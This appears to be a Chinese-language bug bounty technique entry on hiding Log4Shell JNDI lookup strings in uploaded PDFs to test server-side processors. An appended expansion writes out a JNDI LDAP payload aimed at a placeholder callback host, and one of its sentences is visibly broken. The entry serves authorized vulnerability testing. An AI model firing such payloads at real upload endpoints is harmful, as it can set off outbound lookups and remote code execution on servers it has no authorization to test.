---
type: technique
category: trick
derived_from_case: false
vuln_class: Injection
source_url: https://x.com/intigriti/status/2004494400601129247
source_author: intigriti/eelyvy
source_date: 2025-01
collected_at: 2026-05-05
freshness: 2025
confidence: high
risk_level: high
target_types:
  - PDF upload endpoints
---

# PDF Log4Shell Payload Crafting for Processors

## 核心思路

Craft PDF with Log4Shell payload using dedicated GitHub repo technique

## 前置条件

- 目标明确在授权 Bug Bounty scope 内，且 rules 未禁止该测试类别。
- 存在与 `Injection` 相关的业务对象、接口、前端入口或集成链路。
- 使用自有测试账号、测试租户、sandbox 或平台允许的测试数据。
- 如果涉及支付/账号/隐私/生产状态变化，必须先确认项目允许并采用最小影响验证。

## 完整技法细节

- 来源要点：Bypasses text-only filters in PDF processors; injects via file upload
- 适用场景：PDF upload endpoints
- 技法拆解：先找到可控入口，再确认服务端信任边界，最后用最小化证据证明影响。
- 把该技巧拆成：入口发现、可控输入、信任边界、影响证明四段。
- 先找 lab/本地靶场复现，再映射到授权目标。

## 适用目标画像

- PDF upload endpoints

## 为什么有效

- 现代 Web/API 产品通常由多个前端、移动端、后台任务和第三方集成共同访问同一资源，容易出现某一路径缺少服务端校验。
- Bug Bounty 中高价值点通常不是单一 payload，而是“业务前提 + 可控对象 + 服务端信任边界 + 可证明影响”的组合。
- 本条技巧的价值点：Bypasses text-only filters in PDF processors; injects via file upload

## 手工验证流程（授权 / Lab only）

1. 确认 scope、禁止项、速率限制与是否允许该功能测试。
2. 准备至少两个自有测试账号；多租户场景准备两个 organization/workspace。
3. 先完整走通正常业务流，记录对象 ID、角色、状态、token、请求路径。
4. 只替换一个变量或一步状态，观察服务端响应和后续副作用。
5. 用最小必要数据证明影响；不读取、不导出第三方真实数据。
6. 把该技巧拆成：入口发现、可控输入、信任边界、影响证明四段。
7. 先找 lab/本地靶场复现，再映射到授权目标。

## 可自动化部分

- 可自动化收集 endpoint、参数、对象 ID 形态、历史 URL、JS 中的隐藏 API。
- 可自动化做“候选点标记”和“差异对比”，但越权、支付、账号状态影响必须手工确认。

## 误报/失败条件

- 只有客户端表现异常，没有服务端影响。
- 只能影响当前自有账号，无法证明跨权限、跨租户、财务、数据或流程影响。
- 目标业务前提不存在，或服务端已做完整对象归属/状态校验。
- 来源帖子/案例缺少可验证链接时，需降级为 review_queue 并二次确认。

## 授权边界

仅用于授权项目、靶场或自有环境。禁止无授权扫描、凭证滥用、爆破、DoS、真实支付损害、读取第三方真实隐私数据或绕过平台规则。

## 报告 impact 角度

- 说明攻击者前提、受影响对象、服务端缺失的校验，以及可造成的数据访问、权限提升、财务损失、业务流程绕过或租户隔离破坏。
- 证据只保留最小必要截图/请求响应，并打码 token、cookie、PII、支付信息。

## 相关案例链接

- https://x.com/intigriti/status/2004494400601129247

<!-- GROK_EXPANSION_START -->

## Grok Expert 扩展补充

- [https://x.com/intigriti/status/2004494400601129247](https://x.com/intigriti/status/2004494400601129247)
github:
- [https://github.com/eelyvy/log4jshell-pdf](https://github.com/eelyvy/log4jshell-pdf)
author_date: intigriti/eelyvy / 2025-01 tags: ["pdf", "log4shell", "jndi", "processor", "oast"] confidence: high

# PDF Log4Shell 测试载荷 Crafting for Processors

## 核心思路
在PDF元数据或内容中嵌入 benign Log4Shell-style JNDI detection marker（使用
格式并结合
{sys:file.separator}绕过PDF语法限制），测试PDF处理器是否会评估嵌入字符串并触发日志记录，从而检测超出纯文本过滤器的管道行为。

## 前置条件
- 目标存在授权的PDF上传或处理端点（如文档转换、预览或解析服务）。
- 后端PDF库（如Apache PDFBox）会将文件内容/元数据记录到日志中。
- 授权bug bounty程序或自有lab环境（严禁生产环境测试）。

## 完整技法细节
- 使用eelyvy/log4jshell-pdf仓库的template.pdf作为基础模板。
- 在PDF中嵌入JNDI 测试载荷：${jndi:ldap:${sys:file.separator}${sys:file.separator}your-oast-callback${sys:file.separator}marker}（利用系统属性绕过PDF保留字符/限制）。
- 测试载荷放置在会触发ERROR/WARN日志的位置（如malformed metadata或content）。
- 上传PDF到目标处理器，观察是否触发OAST回调（非RCE，仅检测marker）。

## 适用目标画像
PDF上传端点、文档处理器（如PDFBox、pdf.js或其他会解析/日志用户控制字符串的管道）、支持文件上传的Web应用。

## 为什么有效
PDF处理器在解析文件时常生成包含用户输入的日志消息，Log4J会自动解析其中的${jndi:...} lookup字符串，绕过仅针对HTTP输入的过滤器。

## 手工验证流程（授权 / Lab only）
- 在授权lab环境中搭建脆弱PDF处理器（或使用目标授权测试环境）。
- 生成带benign marker的PDF（参考GitHub模板）。
- 通过Burp或curl上传PDF到目标端点。
- 监控OAST平台（Interactsh/DNSlog等）是否收到回调请求。
- 仅验证marker触发，不进行任何代码执行或破坏性操作。

## 可自动化部分
- PDF 测试载荷生成脚本（Python + PyPDF2修改模板）。
- Burp Intruder/自定义Repeater自动化上传与OAST监控。
- Param Miner或自定义fuzzer结合PDF模板批量测试。

## 误报/失败条件
- Log4J已升级至无JNDI解析版本或JNDI lookup被完全禁用。
- PDF处理器不日志用户控制字符串，或使用纯文本过滤器。
- 严格的WAF/输入清洗阻挡${jndi:模式。
- 非PDFBox类处理器无日志触发。

## 授权边界
仅限授权bug bounty程序、VDP或自有lab环境。严禁对任何第三方生产环境进行未经授权测试。测试前必须获得明确书面授权。

## 报告 impact 角度
潜在远程代码执行（RCE）或服务端请求伪造（SSRF），通过PDF处理器触发Log4J JNDI解析。强调“在授权环境中已成功触发OAST回调，证明处理器会评估嵌入字符串”。

## 相关案例链接
- [https://github.com/eelyvy/log4jshell-pdf](https://github.com/eelyvy/log4jshell-pdf)
- [https://x.com/intigriti/status/2004494400601129247](https://x.com/intigriti/status/2004494400601129247)
(Intigriti 2025总结帖)
- Intigriti Log4Shell研究文章（2025）

<!-- GROK_EXPANSION_END -->
